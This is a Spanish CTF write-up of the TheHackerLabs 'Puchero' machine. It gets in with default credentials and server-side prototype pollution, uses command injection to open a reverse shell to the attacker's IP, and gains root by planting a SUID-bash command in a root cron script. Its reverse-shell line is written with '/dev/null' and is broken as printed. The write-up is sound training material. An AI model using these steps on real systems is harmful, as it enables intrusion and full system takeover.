---
title: "Puchero - TheHackerLabs"
date: 2025-06-13
draft: false
slug: "THL-writeup-puchero"
excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, pasamos a analizar las páginas web activas, pero nos enfocamos en la que muestra un login en el puerto 3333. Logrando pasar el login utilizando credenciales por defecto, analizamos el comportamiento de la página admin, que nos permite cargarle una URL y descargar algo. Descubrimos que es posible que sea vulnerable a Server Side Prototype Pollution, pues está ocupando Node JS Express, siendo un framework vulnerable a esto. Probamos y aplicamos un payload que nos da privilegios de administrador, lo que nos permite utilizar de manera funcional la página admin. Además, probamos que también es vulnerable a ejecución de comandos, pues está utilizando la función exec(), siendo una función vulnerable. Aprovechamos esto para obtener una Reverse Shell y al fin conectarnos a la máquina víctima. Dentro, utilizamos la herramienta pspy64 para identificar tareas CRON en segundo plano. Identificamos que se ejecuta un script vacío cada minuto y que podemos modificar. Modificamos el script para que, cuando se ejecute, cambie los permisos de la Bash por permisos SUID y así la podamos ejecutar con privilegios de Root, lo que nos permite escalar privilegios y convertirnos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "Node JS Express", "Web Enumeration", "Fuzzing", "Default Credentials", "BurpSuite", "Server Side Prototype Pollution", "Node JS Command Injection", "System Recognition (Linux)", "Abusing CRON Jobs", "Privesc - Abusing CRON Jobs", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "BurpSuite"
  - "echo"
  - "python3"
  - "tcpdump"
  - "nc"
  - "bash"
  - "grep"
  - "cat"
  - "pspy64"
  - "wget"
  - "chmod"
  - "nano"
links:
  - "https://md5decrypt.net/en/Brainfuck-translator/"
  - "https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit"
  - "https://medium.com/@SpoofIMEI/server-side-prototype-pollution-582fb0ce9a0b"
  - "https://www.marindelafuente.com.ar/ejecucion-de-comandos-shell-con-node-js/"
  - "https://medium.com/@imkarthikeyans/how-to-execute-shell-commands-in-node-js-855c2236f1e"
  - "https://github.com/DominicBreuker/pspy"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-puchero/puchero.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.110
PING 192.168.10.110 (192.168.10.110) 56(84) bytes of data.
64 bytes from 192.168.10.110: icmp_seq=1 ttl=64 time=2.12 ms
64 bytes from 192.168.10.110: icmp_seq=2 ttl=64 time=0.661 ms
64 bytes from 192.168.10.110: icmp_seq=3 ttl=64 time=1.69 ms
64 bytes from 192.168.10.110: icmp_seq=4 ttl=64 time=3.86 ms

--- 192.168.10.110 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3024ms
rtt min/avg/max/mdev = 0.661/2.083/3.863/1.155 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.110 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 10:36 CST
Initiating ARP Ping Scan at 10:36
Scanning 192.168.10.110 [1 port]
Completed ARP Ping Scan at 10:36, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:36
Scanning 192.168.10.110 [65535 ports]
Discovered open port 22/tcp on 192.168.10.110
Discovered open port 80/tcp on 192.168.10.110
Discovered open port 3333/tcp on 192.168.10.110
Completed SYN Stealth Scan at 10:36, 9.22s elapsed (65535 total ports)
Nmap scan report for 192.168.10.110
Host is up, received arp-response (0.00083s latency).
Scanned at 2025-06-13 10:36:05 CST for 9s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE   REASON
22/tcp   open  ssh       syn-ack ttl 64
80/tcp   open  http      syn-ack ttl 64
3333/tcp open  dec-notes syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
           Raw packets sent: 66879 (2.943MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos, me da curiosidad el **puerto 3333**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,3333 192.168.10.110 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 10:36 CST
Nmap scan report for 192.168.10.110
Host is up (0.00084s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))

|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
3333/tcp open  http    Node.js Express framework

| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /login
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que en la página web del **puerto 80** solo está mostrando la página por defecto de **Apache2**.

Y en el **puerto 3333** parece que está mostrando un login.

Veamos si encontramos algo en la página web del **puerto 80** y luego iremos al login del **puerto 3333**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura1.png">
</p>

Es solamente la página por defecto de **Apache2**.

Pero si revisamos el código fuente, encontraremos un comentario interesante:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura2.png">
</p>

Resulta que es un mensaje codificado en **Brainfuck**.

Vamos a decodificarlo con la siguiente página:
* <a href="https://md5decrypt.net/en/Brainfuck-translator/" target="_blank">Brainfuck Translator</a>

Copiamos todo el mensaje y vemos el resultado:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura3.png">
</p>

Parece ser una contraseña, pero por ahora la guardaremos para más adelante.

### Analizando Login del Puerto 3333 {#puerto3333}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura4.png">
</p>

Si revisamos el código fuente, encontraremos la forma en que funciona el login:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura5.png">
</p>

Se realiza la **petición POST** y se utilizan los argumentos **username y password** como data a enviar.

Vamos a capturar la petición con **BurpSuite** y veamos qué respuesta obtenemos al utilizar la petición en el **Repeater**:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura6.png">
</p>

Hay algunos detalles de los que podemos poner atención, por ejemplo:

* Recordando el escaneo de servicios, vimos que el login utiliza **NodeJS Express Framework** y aquí lo podemos comprobar en la respuesta, justo en la cabecera `X-Powered-By`.
* Al fallar el login, nos redirecciona al propio login, lo que complicará el aplicar fuerza bruta.

Quizá podamos aplicar inyecciones SQL o algo importante antes que nada, probar usuarios y contraseñas por defecto.

## Explotación de Vulnerabilidades {#Explotacion}

### Ganando Acceso al Login y Analizando la Página admin {#login}

Algo que siempre hay que probar, son credenciales por defecto, por ejemplo, con el **usuario admin**.

Podríamos probar las contraseñas:
* `pass`
* `admin`
* `12345`
* `password`
* Y muchas más...

Siendo que las credenciales para ganar acceso al login, son `admin:admin`:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura7.png">
</p>

Podemos darle una URL, cargarla y luego nos deja descargar algo.

Veamos el código fuente:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura8.png">
</p>

Al darle una URL, se guarda en el parámetro url y se analiza con la función `check_url()`. Esta función toma la URL que introduzcamos, la envía por petición POST a `/admin/check_ulr` y muestra la respuesta que se obtuvo de la petición, en una ventana emergente con `alert()`.

Tratemos de enviarle una URL de un archivo de texto con contenido random, que será almacenado en un servidor de **Python** en nuestra máquina. 

Por ejemplo:
```bash
echo "Hackeado xd" > test.txt
python3 -m http.server 80
```

Esto para ver qué nos devuelve:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura9.png">
</p>

Nos está mencionando que no somos admin y revisando el servidor, no se ocurrió nada.

Podemos ver mucho mejor la respuesta, si capturamos el envío de la URL con **BurpSuite**:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura10.png">
</p>

Entonces, para que funcione esto, debemos tener privilegios de admin.

Después de revisar lo que hemos encontrado hasta ahora, es posible que la página sea vulnerable a **Prototype Pollution**.

Y más específicamente, al **Server Side Prototype Pollution**.

Lo sabemos porque se está utilizando **NodeJS Express Framework**, que puede ser vulnerable al **Server Side Prototype Pollution**.

Aquí dejo un blog que explica esta vulnerabilidad y como es posible detectarla:
* <a href="https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit" target="_blank">Server side prototype pollution, how to detect and exploit</a>

Solo aplicaremos esta prueba, pues también es probable que rompamos la página web:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura17.png">
</p>

Vamos a probarlo:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura18.png">
</p>

Observa que eliminamos la cookie, cambiamos la cabecera **Content-type** a **JSON** y agregamos ese payload. La respuesta es distinta, indicando que no tenemos autorización y, con respuesta **Forbiden**

Parece que se pudo aplicar la infección, pero no veremos ningún cambio más. Aun así, esto ya nos da una gran pista de que es posible aplicar el **Server Side Prototype Pollution**.

### Aplicando Server Side Prototype Pollution {#ProtoP}

Primero, aquí te dejo un blog que explica como podemos aplicar el **Server Side Prototype Pollution**:
* <a href="https://medium.com/@SpoofIMEI/server-side-prototype-pollution-582fb0ce9a0b" target="_blank">Server-side prototype pollution</a>

Podemos utilizar uno de los payloads que menciona, para obtener privilegios de admin:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura11.png">
</p>

Apliquémoslo:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura12.png">
</p>

Observa como se introduce el payload, transformando la data y la cabecera **Content-type** a **JSON**, eliminando la cookie de sesión y la respuesta que se da al enviar esta data.

Una vez que lo hacemos, ya debería estar infectado el servidor, por lo que si volvemos a mandar una URL (o cualquier cosa) en la petición original, debería aceptarla:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura13.png">
</p>

Incluso, teniendo la misma cookie que obtuvimos al iniciar sesión, funcionó correctamente.

#### Ejecutando Comandos y Ganando Acceso a la Máquina {#Comandos}

Como ya está infectado el servidor, es posible que se puedan ejecutar comandos.

Pues es posible que se estén ocupando dos funciones que son vulnerables a ejecución de comandos en la página actual, siendo `exec()` y `spawn()`.

Aquí te dejo dos blogs que explican esta vulnerabilidad que permite ejecución de comandos en **Node JS**:
* <a href="https://www.marindelafuente.com.ar/ejecucion-de-comandos-shell-con-node-js/" target="_blank">Ejecución de comandos Shell con Node.js</a>
* <a href="https://medium.com/@imkarthikeyans/how-to-execute-shell-commands-in-node-js-855c2236f1e" target="_blank">How to execute shell commands in Node js?</a>

Para intentar la ejecución de comandos, tenemos que probar a separar el envío de la data con `;`, en seguida ponemos el comando que queremos ejecutar y luego comentar lo demás con `#`, para evitar algún error.

Vamos a intentarlo:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura14.png">
</p>

No nos mostró nada, pero tampoco veo un error reflejado, por lo que es posible que se esté ejecutando el comando.

Vamos a mandarnos una **traza ICMP** para comprobar que funciona la ejecución de comandos.

Primero, inicia **tcpdump** para que comience a capturar **paquetes ICMP**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Ahora, usamos **ping** y nos enviamos 2 paquetes:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura15.png">
</p>

Observa **tcpdump**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
16:21:32.621341 IP 192.168.10.110 > Tu_IP: ICMP echo request, id 4211, seq 1, length 64
16:21:32.621372 IP Tu_IP > 192.168.10.110: ICMP echo reply, id 4211, seq 1, length 64
16:21:33.623220 IP 192.168.10.110 > Tu_IP: ICMP echo request, id 4211, seq 2, length 64
16:21:33.623247 IP Tu_IP > 192.168.10.110: ICMP echo reply, id 4211, seq 2, length 64
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel
```
Excelente, podemos aplicar una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Utiliza la siguiente en la petición:
```bash
bash -c 'bash -i >& /dev/null/Tu_IP/443 0>&1'
```

Recuerda **URL encodear** todo este comando y luego envíalo:

<p align="center">
<img src="/assets/images/THL-writeup-puchero/Captura16.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.110] 40324
bash: no se puede establecer el grupo de proceso de terminal (349): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
puchero@puchero:/var/www/html/PrototypePollution-Lab/prototypePoluttion$ whoami
<l/PrototypePollution-Lab/prototypePoluttion$ whoami
puchero
```
Estamos dentro y somos el **usuario puchero**.

Obtengamos una sesión interactiva:
```bash
# Paso 1
script /dev/null -c bash

# Paso 2
CTRL + Z

# Paso 3
stty raw -echo; fg

# Paso 4
reset -> xterm

# Paso 5
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```

Dentro de este directorio, encontraremos el script de la página vulnerable al **Server Side Prototype Pollution**, llamado **routes.js**:
```bash
puchero@puchero:/var/www/html/PrototypePollution-Lab/prototypePoluttion$ ls -la
total 132
drwxr-xr-x  6 puchero root     4096 jun 14 00:23 .
drwxr-xr-x  4 root    root     4096 abr 12  2024 ..
drwxr-xr-x  2 puchero root     4096 may 21  2024 css
drwxr-xr-x  2 puchero root     4096 abr 12  2024 downloads
drwxr-xr-x  2 puchero root     4096 may 21  2024 htmls
-rw-r--r--  1 puchero puchero 11058 may 13  2024 index.html
-rw-r--r--  1 puchero puchero 11058 may 13  2024 index.html.1
-rw-r--r--  1 puchero puchero 11058 may 13  2024 index.html.2
-rw-r--r--  1 puchero puchero 11058 may 13  2024 index.html.3
-rw-r--r--  1 puchero puchero 11058 may 13  2024 index.html.4
-rw-r--r--  1 puchero puchero 11058 may 13  2024 index.html.5
drwxr-xr-x 53 puchero puchero  4096 may 21  2024 node_modules
-rw-r--r--  1 puchero root      293 abr 12  2024 package.json
-rw-r--r--  1 puchero puchero 18380 may 21  2024 package-lock.json
-rw-r--r--  1 puchero root     4317 may 21  2024 routes.js
-rw-r--r--  1 puchero root      254 abr 12  2024 server.js
```

Aquí podemos ver cómo es que es vulnerable a la ejecución de comandos, pues se está ocupando la función `exec()`:
```bash
puchero@puchero:/var/www/html/PrototypePollution-Lab/prototypePoluttion$ cat routes.js | grep exec
const { exec } = require("child_process");
            exec("wget " + url + " -O ./downloads/last_url_download.html --no-check-certificate", (error, stdout, stderr) => {
                    console.log("command executed");
```
Continuemos.

## Post Explotación {#Post}

### Enumeración de Máquina Víctima {#linEnum}

Vamos a movernos al directorio del **usuario puchero**:
```bash
puchero@puchero:/var/www/html$ cd /home/puchero
puchero@puchero:~$
```

Aquí encontraremos la flag del usuario:
```bash
puchero@puchero:~$ ls
user.txt
puchero@puchero:~$ cat user.txt
...
```

Si revisamos el directorio `/opt`, encontraremos un script de bash, pero parece que no tiene contenido:
```bash
puchero@puchero:~$ ls -la /opt/
total 8
drwxr-xr-x  2 root root    4096 may 22  2024 .
drwxr-xr-x 18 root root    4096 abr 12  2024 ..
-rwxrwxrwx  1 root puchero    0 may 22  2024 grasioso.sh
puchero@puchero:~$ cat /opt/grasioso.sh
puchero@puchero:~$
```
Te diría que utilices la herramienta **linpeas.sh**, para buscar alguna vulnerabilidad, pero en mi caso, no encontré ninguna cuando lo ocupé, pero sí vi algo interesante, las **tareas CRON**.

Vamos a utilizar la herramienta **pspy**, para verlas con más detalle.

Puedes descargarlo de aquí:
<a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy</a>

Descarga la versión **pspy64** de la sección **Releases**.

Una vez que lo descargues, envíalo a la máquina víctima, abriendo un servidor con **Python** en tu máquina y utilizando **wget** para descargarlo:
```bash
puchero@puchero:~$ wget http://Tu_IP/pspy64
```

Dale permisos de ejecución y ejecútalo:
```bash
puchero@puchero:~$ chmod +x pspy64 
puchero@puchero:~$ ./pspy64
```

Esperando un par de minutos, podemos ver lo siguiente:
```bash
2025/06/14 04:18:23 CMD: UID=0     PID=1      | /sbin/init 
2025/06/14 04:19:01 CMD: UID=0     PID=17567  | /usr/sbin/CRON -f 
2025/06/14 04:19:01 CMD: UID=0     PID=17568  | /usr/sbin/CRON -f 
2025/06/14 04:19:01 CMD: UID=0     PID=17569  | /bin/sh -c /bin/bash -c /opt/grasioso.sh 
2025/06/14 04:19:01 CMD: UID=0     PID=17570  | 
2025/06/14 04:20:01 CMD: UID=0     PID=17571  | /usr/sbin/CRON -f 
2025/06/14 04:20:01 CMD: UID=0     PID=17572  | /usr/sbin/CRON -f 
2025/06/14 04:20:01 CMD: UID=0     PID=17573  | /bin/sh -c /bin/bash -c /opt/grasioso.sh 
2025/06/14 04:20:01 CMD: UID=0     PID=17574  |
```
El **usuario Root** (**UID=0**) está ejecutando una **tarea CRON**, que ejecuta cada minuto el script **grasioso.sh** que encontramos en el directorio `/opt`.

Se me ocurre utilizar este script para darle **permisos SUID** a la **Bash**.

### Escalando Privilegios con Tarea CRON Activa {#bash}

Primero, veamos los permisos de la **Bash**:
```bash
puchero@puchero:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```
Solamente tiene permisos de ejecución específicos.

Modifiquemos el script **grasioso.sh** para que ejecute **chmod** y le dé **permisos SUID** a la **Bash**:
```bash
puchero@puchero:~$ nano /opt/grasioso.sh
------------------
chmod u+s /bin/bash
```

Esperemos un minuto y vuelve a revisar los permisos de la **Bash**:
```bash
puchero@puchero:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```
Ya tiene **permisos SUID**.

Ahora, ejecutemos la **Bash** con privilegios:
```bash
puchero@puchero:~$ bash -p
bash-5.2# whoami
root
```
Listo, somos **Root**.

Podemos comprobar la **tarea CRON** que está ejecutando el **Root**:
```bash
bash-5.2# cat /var/spool/cron/crontabs/root
...
# m h  dom mon dow   command

* * * * * /bin/bash -c /opt/grasioso.sh
```
Ahí está.

Ya solamente, obtengamos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
